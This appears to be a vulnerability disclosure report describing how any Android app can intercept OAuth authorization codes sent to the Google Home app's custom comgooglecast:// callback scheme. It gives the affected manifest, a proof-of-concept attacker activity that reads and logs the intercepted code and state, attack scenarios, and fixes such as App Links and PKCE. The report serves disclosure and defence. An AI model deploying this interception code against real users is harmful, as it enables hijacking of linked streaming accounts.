# VRP Report #40: Google Home (Chromecast) OAuth Callback Interception via Custom Scheme

## Summary
Google Home (`com.google.android.apps.chromecast.app`) uses a custom URI scheme `comgooglecast://` for OAuth callback handling in its `OAuthHandoffActivity`. Since custom URI schemes are not exclusive on Android (RFC 8252 §8.1) and cannot be verified via Android App Links, any app can register to intercept the OAuth redirect `comgooglecast://chromecast.auth.com/done`, potentially capturing OAuth authorization codes during Cast device media app authentication.

## Affected Component

| Component | Exported | Permission | Scheme |
|-----------|----------|------------|--------|
| `OAuthHandoffActivity` | true | NONE | `comgooglecast://chromecast.auth.com/done` |
| `OAuthHandoffActivity` | true | NONE | `comgooglecast://offers/end` |

## Vulnerability Details

### Intent-Filter Configuration (AndroidManifest.xml)
```xml
<activity android:name="com.google.android.apps.chromecast.app.mediaapps.OAuthHandoffActivity"
    android:exported="true"
    android:excludeFromRecents="true"
    android:launchMode="singleTask">
    
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="comgooglecast"
              android:host="chromecast.auth.com"
              android:pathPattern="/done"/>
    </intent-filter>
    
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="comgooglecast"
              android:host="offers"
              android:pathPattern="/end"/>
    </intent-filter>
</activity>
```

### Key Issue: autoVerify is Ineffective for Custom Schemes
`autoVerify=true` only works for `http://` and `https://` schemes via Digital Asset Links. For the custom `comgooglecast://` scheme, this attribute has NO EFFECT — the scheme is freely registerable by any app.

### OAuth Flow
1. User initiates media app OAuth in Google Home (e.g., linking Spotify, Netflix to Cast)
2. OAuthHandoffActivity starts Custom Tab with Google OAuth URL (validated `.google.com` host)
3. User authenticates in browser
4. OAuth server redirects to `comgooglecast://chromecast.auth.com/done?code=AUTH_CODE&state=STATE`
5. **Vulnerability**: Attacker's app also registered for this URI can intercept the redirect

### Existing Mitigations (Partial)
- `onNewIntent()` (line 53): validates `getCallingPackage() == getPackageName()` — but this only protects the Chromecast app's instance, not against a different app receiving the redirect
- `authUrl` validation: checks host ends with `.google.com` — only for the initial OAuth URL, not the callback

## Proof of Concept

```java
// Attacker's AndroidManifest.xml
<activity android:name=".CastOAuthInterceptActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="comgooglecast"
              android:host="chromecast.auth.com"
              android:pathPattern="/done"/>
    </intent-filter>
</activity>

// CastOAuthInterceptActivity.java
public class CastOAuthInterceptActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();
        // Intercept OAuth code from redirect
        String authCode = data.getQueryParameter("code");
        String state = data.getQueryParameter("state");
        Log.d("INTERCEPTED", "Auth code: " + authCode + " State: " + state);
    }
}
```

## Impact

### Confidentiality (HIGH)
- OAuth authorization codes for Cast media app authentication can be intercepted
- Allows attacker to use the code to authenticate as the user to the media service
- Media accounts (Spotify, Netflix, YouTube Music, etc.) linked to Cast can be compromised

### Attack Scenarios
1. **Account hijacking**: Intercepted auth code used to link attacker's Cast device to victim's media accounts
2. **Session theft**: Authorization code exchanged for access tokens to victim's streaming accounts
3. **Credential harvesting**: Attacker builds profile of victim's streaming service accounts

### Severity
- **User Interaction**: NONE beyond normal Cast setup flow
- **Permissions Required**: NONE
- **Attack Complexity**: LOW (standard intent-filter registration)

## Fix Recommendation
Use Android App Links (`https://` scheme) with Digital Asset Links verification for OAuth callbacks instead of custom schemes. Alternatively, use PKCE (RFC 7636) to bind the authorization code to the originating session.

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- Google Home version as bundled
